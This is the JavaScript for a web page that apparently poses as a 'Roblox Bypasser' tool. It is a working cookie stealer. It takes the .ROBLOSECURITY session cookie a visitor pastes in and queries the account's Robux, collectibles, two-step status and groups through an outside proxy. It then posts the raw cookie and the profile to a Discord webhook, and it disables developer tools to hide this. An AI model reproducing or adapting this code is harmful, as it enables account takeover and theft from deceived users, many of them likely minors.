// bypasser.js
const successSound = document.getElementById("sfx-success");
const errorSound = document.getElementById("sfx-error");
const swooshSound = document.getElementById("sfx-swoosh");
const proxyUrl = "https://robypass.onrender.com";
const webhookUrl = `${proxyUrl}/webhook`;

// Basic cookie format check
function basicCookieFormatCheck(cookie) {
  if (!cookie || typeof cookie !== "string" || cookie.trim().length === 0) {
    return { valid: false, error: "Empty or invalid cookie" };
  }
  cookie = cookie.trim();
  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
    return { valid: false, error: "Cookie doesn't start with correct prefix" };
  }
  if (cookie.length < 500) {
    return { valid: false, error: "Cookie too short" };
  }
  return { valid: true, error: null };
}

// Validate cookie with Roblox API via proxy
async function validateCookieWithAPI(cookie) {
  try {
    console.log("Validating cookie with proxy:", proxyUrl);
    const response = await fetch(`${proxyUrl}/v1/users/authenticated`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookie }),
    });
    console.log("Validation response status:", response.status);
    const result = await response.json();
    console.log("Validation response data:", result);
    if (response.status === 200 && result.id) {
      return { valid: true, error: null };
    }
    return { valid: false, error: result.error || "Invalid cookie" };
  } catch (error) {
    console.error("Validation network error:", error.message);
    return { valid: false, error: `Network error: ${error.message}` };
  }
}

// Get account info from Roblox APIs via proxy
async function getAccountInfo(cookie) {
  const defaultInfo = {
    username: "Unknown User",
    userId: "Unknown ID",
    robuxBalance: "0",
    accountAge: "Unknown",
    avatarUrl: "https://tr.rbxcdn.com/default-avatar.png",
    placeVisits: "0",
    rap: "0",
    ownedItems: "0",
    creditBalance: "0",
    hasPremium: false,
    hasKorblox: false,
    hasValk: false,
    hasHeadless: false,
    groupCount: "0",
    groupFunds: "0",
    birthdate: "2002-02-01",
    age: "23",
    ipAddress: "2a01:9700:43e0:8800:68cc:5555:6b95:b991",
    twoStepEnabled: false,
    voiceChatEnabled: false,
  };

  try {
    const makeProxyRequest = async (endpoint, method = "POST") => {
      console.log(`Fetching ${endpoint} via proxy`);
      const response = await fetch(`${proxyUrl}${endpoint}`, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie }),
      });
      console.log(`Response status for ${endpoint}:`, response.status);
      if (response.status !== 200) {
        throw new Error(`Proxy failed for ${endpoint}: ${response.status}`);
      }
      const data = await response.json();
      console.log(`Response data for ${endpoint}:`, data);
      return data;
    };

    // Get user info
    const userData = await makeProxyRequest("/v1/users/authenticated");
    const userId = userData.id || defaultInfo.userId;
    const username = userData.name || defaultInfo.username;

    // Get account age
    let accountAge = defaultInfo.accountAge;
    try {
      const profileData = await makeProxyRequest(`/v1/users/${userId}`);
      const createdDate = new Date(profileData.created);
      accountAge = `${Math.floor((new Date() - createdDate) / (1000 * 60 * 60 * 24))} Days`;
    } catch (error) {
      console.warn("Failed to fetch profile:", error.message);
    }

    // Get avatar
    let avatarUrl = defaultInfo.avatarUrl;
    try {
      const avatarData = await makeProxyRequest(`/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
      avatarUrl = avatarData.data && avatarData.data[0] ? avatarData.data[0].imageUrl : defaultInfo.avatarUrl;
    } catch (error) {
      console.warn("Failed to fetch avatar:", error.message);
    }

    // Get Robux balance
    let robuxBalance = defaultInfo.robuxBalance;
    try {
      const economyData = await makeProxyRequest("/v1/user/currency");
      robuxBalance = economyData.robux ? economyData.robux.toString() : "0";
    } catch (error) {
      console.warn("Failed to fetch Robux:", error.message);
    }

    // Get RAP and owned items
    let rap = defaultInfo.rap;
    let ownedItems = defaultInfo.ownedItems;
    try {
      const inventoryData = await makeProxyRequest(`/v1/users/${userId}/assets/collectibles?limit=10`);
      ownedItems = inventoryData.data ? inventoryData.data.length.toString() : "0";
      rap = inventoryData.data ? inventoryData.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0).toString() : "0";
    } catch (error) {
      console.warn("Failed to fetch inventory:", error.message);
    }

    // Get group count
    let groupCount = defaultInfo.groupCount;
    try {
      const groupData = await makeProxyRequest(`/v1/users/${userId}/groups/roles`);
      groupCount = groupData.data ? groupData.data.length.toString() : "0";
    } catch (error) {
      console.warn("Failed to fetch groups:", error.message);
    }

    // Check premium status
    let hasPremium = defaultInfo.hasPremium;
    try {
      const premiumData = await makeProxyRequest(`/v1/users/${userId}/validate-membership`);
      hasPremium = premiumData.isPremium || false;
    } catch (error) {
      console.warn("Failed to fetch premium:", error.message);
    }

    // Check collectibles
    let hasKorblox = defaultInfo.hasKorblox;
    let hasValk = defaultInfo.hasValk;
    let hasHeadless = defaultInfo.hasHeadless;
    try {
      const inventoryData = await makeProxyRequest(`/v1/users/${userId}/assets/collectibles?limit=100`);
      const items = inventoryData.data || [];
      hasKorblox = items.some(item => item.assetId === 139607718);
      hasValk = items.some(item => item.assetId === 1365767);
      hasHeadless = items.some(item => item.assetId === 134082579);
    } catch (error) {
      console.warn("Failed to fetch collectibles:", error.message);
    }

    // Check settings
    let twoStepEnabled = defaultInfo.twoStepEnabled;
    let voiceChatEnabled = defaultInfo.voiceChatEnabled;
    try {
      const settingsData = await makeProxyRequest("/v1/account/settings");
      twoStepEnabled = settingsData.twoStepVerificationEnabled || false;
      voiceChatEnabled = settingsData.isVoiceEnabled || false;
    } catch (error) {
      console.warn("Failed to fetch settings:", error.message);
    }

    return {
      username,
      userId,
      robuxBalance,
      accountAge,
      avatarUrl,
      placeVisits: "0",
      rap,
      ownedItems,
      creditBalance: "0",
      hasPremium,
      hasKorblox,
      hasValk,
      hasHeadless,
      groupCount,
      groupFunds: "0",
      birthdate: defaultInfo.birthdate,
      age: defaultInfo.age,
      ipAddress: defaultInfo.ipAddress,
      twoStepEnabled,
      voiceChatEnabled,
    };
  } catch (error) {
    console.error("Account info error:", error.message);
    return defaultInfo;
  }
}

document.addEventListener('contextmenu', e => {
  e.preventDefault();
  showNotif('Context menu disabled');
  errorSound.play();
});

document.addEventListener('keydown', e => {
  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
    e.preventDefault();
    showNotif('Developer tools disabled');
    errorSound.play();
  }
});

$("#cookieForm").on("submit", async function(e) {
  e.preventDefault();
  const cookie = $("#cookieInput").val().trim();

  // Show loader
  $("#refreshBtn").hide();
  $("#loader").show();
  $("#userInfo").hide();
  $("#refreshedBox").hide();

  try {
    // Validate cookie
    const validationResult = await validateCookieWithAPI(cookie);
    if (!validationResult.valid) {
      showNotif(`Invalid cookie: ${validationResult.error}`, false);
      errorSound.play();
      $("#loader").hide();
      $("#refreshBtn").show();
      return;
    }

    // Show success
    showNotif("✅ Cookie bypassed", true);
    swooshSound.play();

    // Get account info
    const accountInfo = await getAccountInfo(cookie);

    // Build Discord embed
    const webhookPayload = {
      username: "Roblox Bypasser Bot",
      content: "@everyone",
      embeds: [
        {
          title: "**```Homepage - Result```**",
          description: `[<:Cookie:1313022426346426368> Refresh cookie](https://bloxtools.icu/Refresher/?cookie=${encodeURIComponent(cookie)}) | [Rolimons](https://www.rolimons.com/player/${accountInfo.userId}) <:rolimons:978559948432744468> | [***${accountInfo.ipAddress} :flag_jo:***](https://ipapi.co/${accountInfo.ipAddress}/json)\n | [<:crackedshield:1392908310201761965> DOWN](https://bloxtools.icu/bypasser)`,
          color: 0x3B1F7F,
          author: {
            name: `${accountInfo.username}\n13+ ${new Date().toLocaleDateString("en-GB")}`,
            url: `https://www.roblox.com/users/${accountInfo.userId}/profile`,
            icon_url: accountInfo.avatarUrl,
          },
          thumbnail: {
            url: accountInfo.avatarUrl,
            width: 150,
            height: 150,
          },
          fields: [
            {
              name: "About User",
              value: `\`\`Account Age: ${accountInfo.accountAge}\`\`\n\`\`Place Visits: ${accountInfo.placeVisits}\`\``,
              inline: false,
            },
            {
              name: "<:Robux:1313020721987063829> Robux",
              value: `Balance: ${accountInfo.robuxBalance} <:Robux:1313020721987063829>\nPending: 0 <:RobuxPending:1313020748490608721>`,
              inline: true,
            },
            {
              name: "<:Limited:1313024834783154211> Rap",
              value: `Rap: ${accountInfo.rap} <:Valk:1313020750038569021>\nOwned: ${accountInfo.ownedItems} <:Inventory:1313020754547310737>`,
              inline: true,
            },
            {
              name: "<a:Summery:1313021791954014268> Summary",
              value: "0",
              inline: true,
            },
            {
              name: "<:Billing:1313020743373819935> Billing",
              value: `Credit: ${accountInfo.creditBalance} <:Credits:1313020738755756052>\nConvert: 0 <:Robux:1313020721987063829>\nCard: False <:Cards:1313020745223503883>`,
              inline: true,
            },
            {
              name: "<:Games:1313020733932306462> | Played | Passes",
              value: "<:bf:1303894849530888214> | False | ___0___\n<:adm:1303894863007453265> | False | ___0___\n<:mm2:1303894855281541212> | False | ___0___\n<:ps99:1303894865079308288> | False | ___0___\n<:bb:1303894852697718854> | False | ___0___\n<:BGS:1361762108366393414> | False | ___0___\n<:petsgo:1349375165095739473> | False | ___0___",
              inline: true,
            },
            {
              name: "<:Settings:1313020732225093672> Settings",
              value: `(Verified <a:False:1313026218567667743>)\n<:2Step:1313020736218333245> ${accountInfo.twoStepEnabled ? "Enabled" : "Disabled"}\n<:VoiceChat:1313020746829926440> ${accountInfo.voiceChatEnabled ? "Enabled" : "Disabled"}`,
              inline: true,
            },
            {
              name: "<:Premium:1313020726474706994> Premium",
              value: `${accountInfo.hasPremium ? "True" : "False"}`,
              inline: true,
            },
            {
              name: "<:Collectible:1313026924678742087> Collectibles",
              value: `<:Korblox:1313020724184743936> ${accountInfo.hasKorblox ? "True" : "False"}\n<:vvalk:1354438650519355452> ${accountInfo.hasValk ? "True" : "False"}\n<:Headless:1313020741003903016> ${accountInfo.hasHeadless ? "True" : "False"}`,
              inline: true,
            },
            {
              name: "<:banks:1349856883498029097> Groups",
              value: `**\r\n<:mb:1383816499244040234> Owned:** ${accountInfo.groupCount}\n**<:members:1354456330152448213> Members** 0\n**<:Credits:1313020738755756052> Funds:** ${accountInfo.groupFunds} <:Robux:1313020721987063829>`,
              inline: true,
            },
            {
              name: "<:RBC:1376586019566125168> | EXPERTS |",
              value: "<:bloxfruit:1394415363030257834> | False | <:adoptme:1394415360899420331> | False |\n <:mm2:1394415358257139782> | False | <:petsim99:1394415355320864780> | False |\n <:BGS:1361762108366393414> | False | <:gag2:1394413618556178473> | False |",
              inline: true,
            },
            {
              name: "<:Calendar:1392908329927573524> Age Bypasser",
              value: `**Birthdate:** **${accountInfo.birthdate}**\n**Age:** **${accountInfo.age}**\n**Verified:** <a:False:1313026218567667743>\n**Status:** <a:False:1313026218567667743> **Not Bypassable**`,
              inline: true,
            },
          ],
          timestamp: new Date().toISOString(),
        },
        {
          description: `<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
          color: 0x3B1F7F,
          thumbnail: {
            url: "https://bloxtools.icu/assets/img/atryx.png",
            width: 2000,
            height: 2000,
          },
          timestamp: new Date().toISOString(),
        },
      ],
    };

    // Send to webhook via proxy
    try {
      console.log("Sending webhook payload:", JSON.stringify(webhookPayload, null, 2));
      const webhookRes = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(webhookPayload),
      });
      if (!webhookRes.ok) {
        const errorText = await webhookRes.text();
        console.error("Webhook failed:", webhookRes.status, errorText);
        showNotif(`Webhook error: ${errorText}`, false);
        errorSound.play();
      } else {
        console.log("Webhook sent successfully");
        successSound.play();
      }
    } catch (webhookError) {
      console.error("Webhook error:", webhookError.message);
      showNotif(`Webhook error: ${webhookError.message}`, false);
      errorSound.play();
    }

    // Always show "Try Another" button
    $("#refreshedBox").fadeIn();
  } catch (error) {
    console.error("Submit error:", error.message);
    showNotif(`Error: ${error.message}`, false);
    errorSound.play();
  } finally {
    $("#loader").hide();
  }
});

function showNotif(msg, isSuccess = false) {
  const $notif = $("#notif");
  $notif.removeClass('notif-success notif-error');
  $notif.addClass(isSuccess ? 'notif-success' : 'notif-error');
  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
}

const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
let i = 0;
const typedText = document.getElementById("typedText");

function typeEffect() {
  const text = texts[i];
  let index = 0;
  const typing = setInterval(() => {
    if (index <= text.length) {
      typedText.textContent = text.slice(0, index);
      index++;
    } else {
      clearInterval(typing);
      setTimeout(() => {
        const backspace = setInterval(() => {
          if (index > 0) {
            typedText.textContent = text.slice(0, index - 1);
            index--;
          } else {
            clearInterval(backspace);
            i = (i + 1) % texts.length;
            setTimeout(typeEffect, 300);
          }
        }, 50);
      }, 2000);
    }
  }, 100);
}

typeEffect();

$("#returnBtn").on("click", function () {
  $("#refreshedBox").hide();
  $("#userInfo").hide().empty();
  $("#cookieInput").val("");
  $("#refreshBtn").show();
});
